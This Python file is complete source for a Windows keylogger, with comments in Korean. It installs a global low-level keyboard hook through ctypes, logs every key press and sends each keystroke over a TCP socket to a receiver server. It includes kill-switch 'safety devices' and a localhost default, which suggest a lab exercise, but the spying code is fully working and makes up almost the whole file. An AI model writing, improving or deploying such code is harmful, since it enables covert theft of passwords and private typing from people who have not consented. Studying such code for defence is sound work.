import socket
import threading
import time
import os
import sys
from ctypes import windll, CFUNCTYPE, POINTER, c_void_p, c_int, Structure
from ctypes.wintypes import DWORD, HWND, LPARAM, WPARAM, HHOOK

# ==================== 설정 ====================
SERVER_IP = "127.0.0.1"
SERVER_PORT = 4444
KILL_FILE = r"C:\stop_keylog.txt"      # 이 파일이 존재하면 자동 종료

# Windows Low-Level Keyboard Hook 상수
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100

# 전역 변수
sock = None
connected = False
hook = None
running = True


# Windows API 로드
user32 = windll.user32
kernel32 = windll.kernel32

# Windows API 함수 argtypes 설정 (64비트 안정성 위해)
user32.SetWindowsHookExA.argtypes = [c_int, CFUNCTYPE(c_int, c_int, WPARAM, LPARAM), c_void_p, DWORD]
user32.SetWindowsHookExA.restype = HHOOK
user32.CallNextHookEx.argtypes = [HHOOK, c_int, WPARAM, c_void_p]
user32.CallNextHookEx.restype = c_int


class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ("vkCode", DWORD),
        ("scanCode", DWORD),
        ("flags", DWORD),
        ("time", DWORD),
        ("dwExtraInfo", POINTER(c_void_p))  # ULONG_PTR
    ]

@CFUNCTYPE(c_int, c_int, WPARAM, LPARAM)
def keyboard_hook(nCode, wParam, lParam):
    """
    Windows가 키보드 입력이 발생할 때마다 호출하는 저수준 훅(Callback) 함수
    
    - nCode: 훅 코드 (0이면 처리해야 함)
    - wParam: 메시지 종류 (WM_KEYDOWN 등)
    - lParam: 키보드 상세 정보 (vkCode 등)
    
    Safety feature + key logging logic
    """
    global running
    if not running:
        return user32.CallNextHookEx(hook, nCode, wParam, lParam)

    # 안전장치 3: Kill-switch 파일 존재 여부 체크
    if os.path.exists(KILL_FILE):
        running = False
        send_log("=== Killed by C:\\stop_keylog.txt ===")
        return user32.CallNextHookEx(hook, nCode, wParam, lParam)

    if nCode == 0 and wParam == WM_KEYDOWN:
        # lParam을 구조체로 변환
        kb = KBDLLHOOKSTRUCT.from_address(lParam)
        vk_code = kb.vkCode

        # 안전장치 1: ESC 키
        if vk_code == 0x1B:
            send_log("=== Stopped by ESC ===")
            running = False
            return 1   # 1을 반환하면 해당 키 입력이 OS에 전달되지 않음

        # 안전장치 2: Ctrl + Alt + Shift + K 조합
        if vk_code == 0x4B:  # 'K' 키
            ctrl  = user32.GetAsyncKeyState(0x11) & 0x8000  # Ctrl
            alt   = user32.GetAsyncKeyState(0x12) & 0x8000  # Alt
            shift = user32.GetAsyncKeyState(0x10) & 0x8000  # Shift
            if ctrl and alt and shift:
                send_log("=== Killed by Ctrl+Alt+Shift+K ===")
                running = False
                return 1

        # 실제 키 로깅
        key_name = get_key_name(vk_code)
        send_log(f"Key: {key_name} (VK: {vk_code})")

    # 다음 훅으로 키 정보를 전달 (중요!)
    # CallNextHookEx 호출시 lParam을 c_void_p로 안전하게 변환
    return user32.CallNextHookEx(hook, nCode, wParam, c_void_p(lParam))


def get_key_name(vk):
    """
    가상키 코드(vk_code)를 사람이 읽기 쉬운 문자열로 변환하는 함수
    
    - 특수키는 이름으로, 일반 키는 문자로 반환
    """
    keys = {
        0x08: "Backspace", 0x09: "Tab", 0x0D: "Enter", 0x20: "Space",
        0x1B: "ESC", 0x2D: "Insert", 0x2E: "Delete",
        0x21: "PageUp", 0x22: "PageDown", 0x23: "End", 0x24: "Home",
        0x25: "Left", 0x26: "Up", 0x27: "Right", 0x28: "Down"
    }
    return keys.get(vk, chr(vk) if 32 <= vk <= 126 else f"VK_{vk}")


def connect_to_server():
    """
    Receiver(192.168.0.3)와 TCP 연결을 시도하는 함수
    - 연결 실패 시 3초 간격으로 재시도
    - 연결 성공 시 connected 플래그를 True로 설정
    """
    global sock, connected
    while running and not connected:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((SERVER_IP, SERVER_PORT))
            connected = True
            print(f"[+] Connected to {SERVER_IP}:{SERVER_PORT}")
            return True
        except:
            time.sleep(3)
    return False


def send_log(msg):
    """
    키로깅 데이터를 서버로 전송하는 함수
    - 연결이 끊어졌으면 자동으로 재연결 시도
    - 전송 실패 시 connected = False로 설정하여 다음에 재연결
    """
    global sock, connected
    if not connected or sock is None:
        print(f"[DEBUG] Reconnecting before send...")
        if not connect_to_server():
            print("[DEBUG] Reconnect failed, dropping log")
            return

    try:
        full_msg = f"{msg}\n"
        sock.sendall(full_msg.encode('utf-8', errors='ignore'))
        print(f"[DEBUG] Sent to server: {msg}")   # ← 성공 시 출력
    except Exception as e:
        print(f"[DEBUG] Send failed: {e}")
        connected = False
        if sock:
            try: sock.close()
            except: pass
        sock = None


def get_error_message(code):
    """ hook 실패 에러코드 분석"""
    errors = {
        5: "Access Denied (관리자 권한 부족)",
        87: "Invalid Parameter",
        126: "Module not found",
        127: "Procedure not found",
        998: "Invalid access to memory",
    }
    return errors.get(code, "Unknown error")

def start_hook():
    global hook
    print("[*] Trying to install keyboard hook...")

    # 기존: kernel32.GetModuleHandleW(None)
    # 변경: 0 (WH_KEYBOARD_LL 글로벌 훅에서는 이게 더 안정적임)
    hook = user32.SetWindowsHookExA(
        WH_KEYBOARD_LL,
        keyboard_hook,
        0,          # ← 여기서 0으로 변경!!
        0
    )
   
    if not hook:
        error_code = kernel32.GetLastError()
        print(f"[-] Failed to install keyboard hook.")
        print(f"    Error Code: {error_code}")
        return False
   
    print("[+] Keyboard hook installed successfully!")
    print("[+] Keylogger is now running... (Press ESC or Ctrl+Alt+Shift+K to stop)")
    
    windll.user32.GetMessageA(None, 0, 0, 0)
    return True



if __name__ == "__main__":
    print("[+] Windows stdlib Keylogger started")
    print("    Safety devices: ESC | Ctrl+Alt+Shift+K | C:\\stop_keylog.txt")
    
    connect_to_server()
    
    if not start_hook():
        sys.exit(1)
    
    try:
        while running:
            time.sleep(0.3)
    finally:
        # 정리 작업
        if hook:
            user32.UnhookWindowsHookEx(hook)
        if sock:
            try:
                sock.close()
            except:
                pass
        print("[!] Keylogger terminated safely.")
